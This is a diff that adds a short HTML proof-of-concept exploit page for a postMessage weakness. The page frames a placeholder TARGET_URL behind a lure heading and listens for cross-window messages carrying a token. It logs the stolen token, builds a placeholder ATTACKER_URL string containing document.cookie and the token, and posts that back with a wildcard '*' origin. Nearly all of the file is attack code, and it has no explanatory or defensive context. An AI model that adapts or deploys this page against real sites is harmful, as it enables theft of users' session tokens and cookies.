@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>postMessage</title>
+</head>
+<body>
+    <H1>Hi Get Hamberger</H1> 
+    <iframe id="victimFrame" src="TARGET_URL" ></iframe>
+
+    <script>
+        // Exploitation script
+        window.addEventListener('message', (event) => {
+            // If there were a token
+            if (event.data && event.data.token) {
+                const stolenToken = event.data.token;
+                console.log("Token Hacked", stolenToken);
+
+                // Creating a malicious URL
+                const maliciousUrl = "ATTACKER_URL=" + 
+                                    encodeURIComponent(document.cookie) + 
+                                    "&token=" + stolenToken;
+
+                // Sending a message 
+                event.source.postMessage({
+                    token: stolenToken, // Token 
+                    url: maliciousUrl   // URL Attacker
+                }, "*");
+            }
+        });
+    </script>
+</body>
+</html>
